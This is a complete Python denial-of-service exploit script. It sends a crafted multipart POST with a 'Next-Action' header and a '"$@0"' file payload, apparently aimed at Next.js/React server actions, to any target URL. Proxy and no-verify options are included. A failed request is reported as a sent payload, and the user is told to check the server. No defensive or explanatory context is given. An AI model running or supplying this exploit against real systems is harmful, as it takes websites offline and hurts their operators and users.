#!/usr/bin/env python3
"""
DOS
"""

import sys
import argparse
import requests
from requests.adapters import HTTPAdapter

requests.packages.urllib3.disable_warnings()


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('target')
    parser.add_argument('--proxy')
    parser.add_argument('--no-verify', action='store_true')
    parser.add_argument('--timeout', type=int, default=10)

    return parser.parse_args()


def main():
    global args
    args = parse_args()

    print('=' * 60)
    print('DoS Exploit')
    print('=' * 60)
    print(f'Target: {args.target}')
    print()

    session = requests.Session()

    proxies = {}
    if args.proxy:
        proxies = {'http': args.proxy, 'https': args.proxy}
        print(f'[*] Using proxy: {args.proxy}')

    session.proxies.update(proxies)
    session.verify = not args.no_verify

    adapter = HTTPAdapter(max_retries=2)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    try:
        print("[i] DoS payload sending...")

        session.post(
            args.target,
            files={"0": ("", '"$@0"')},
            headers={
                "Next-Action": "x",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"  # noqa
            },
            timeout=args.timeout,
        )

        print("[!] Server probably not vulnerable")

    except KeyboardInterrupt:
        print('\n[!] Interrupted')
        sys.exit(0)
    except requests.exceptions.RequestException:
        print("[!] DoS payload sent, check server")
    except Exception as e:
        print(f'[!] Error: {e}')


if __name__ == '__main__':
    main()
